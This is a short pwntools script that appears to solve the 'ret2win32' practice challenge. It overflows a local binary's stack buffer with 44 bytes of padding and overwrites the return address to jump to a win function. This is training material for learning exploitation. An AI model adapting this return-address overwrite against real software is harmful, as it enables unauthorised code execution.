from pwn import *

context(terminal=['tmux','new-window'])
context(os='linux',arch='i386')
# p = gdb.debug('ret2win32')
p = process('ret2win32')
ret2win = p32(0x08048659)
padding = "A"*44

payload = padding.encode()+ret2win
# sys.stdout.buffer.write(payload)

p.sendline(payload)
print(p.recvall().decode())
